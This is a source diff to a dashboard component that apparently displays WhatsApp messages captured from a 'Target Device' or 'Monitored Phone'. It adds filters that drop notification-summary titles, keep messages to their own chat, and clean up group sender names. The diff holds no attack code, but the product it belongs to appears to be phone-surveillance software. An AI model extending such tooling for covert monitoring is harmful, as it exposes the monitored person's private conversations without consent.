@@ -577,6 +577,7 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
           !name.includes("radio group") &&
           !name.includes("filter") &&
           !name.includes("unread status") &&
+          !/^\d+\s+messages?\s+from\s+\d+\s+chats?/i.test(name) &&
           name !== "whatsapp" &&
           name !== "whatsapp group"
         );
@@ -999,6 +1000,36 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
             ) {
               return false;
             }
+
+            // Exclude summary notification titles
+            if (
+              currentChatName.match(/^\s*\d+\s+messages?\s+from\s+\d+\s+chats?/i) ||
+              ((m as any).chat_name && (m as any).chat_name.match(/^\s*\d+\s+messages?\s+from\s+\d+\s+chats?/i))
+            ) {
+              return false;
+            }
+
+            // Strict chat isolation: ensure message belongs to the current chat
+            if ((m as any).chat_name) {
+              const msgChat = String((m as any).chat_name).trim().toLowerCase();
+              const currChat = currentChatName.trim().toLowerCase();
+              if (msgChat !== currChat) {
+                return false;
+              }
+            }
+
+            // If sender has "Sender @ GroupName", ensure it matches the current group
+            if (m.sender && /@/.test(m.sender)) {
+              const parts = m.sender.split(/\s*@\s*/);
+              if (parts.length > 1) {
+                const groupPart = parts[1].trim().toLowerCase();
+                const currChat = currentChatName.trim().toLowerCase();
+                if (groupPart && groupPart !== currChat) {
+                  return false;
+                }
+              }
+            }
+
             return true;
           });
 
@@ -1023,9 +1054,14 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
               cleanText.includes("📷") ||
               cleanText.toLowerCase().includes("photo");
 
+            const rawSender = m.sender || currentChatName;
+            const cleanSender = isTargetSent
+              ? "Target Device"
+              : (rawSender.includes("@") ? rawSender.split(/\s*@\s*/)[0].trim() : rawSender);
+
             return {
               id: m.id,
-              sender: isTargetSent ? "Target Device" : (m.sender || currentChatName),
+              sender: cleanSender,
               text: cleanText,
               isOutgoing: isTargetSent,
               timestamp: m.message_time,
@@ -2566,7 +2602,7 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
                                           <span className="truncate">
                                             {isTargetSent
                                               ? "Sent by Target (Monitored Phone)"
-                                              : `Received from: ${m.sender || selectedChatSummary.chatName}`}
+                                              : `Received from: ${(m.sender || selectedChatSummary.chatName).split(/\s*@\s*/)[0].trim()}`}
                                           </span>
                                         </span>
                                         <div className="flex items-center gap-1 shrink-0">
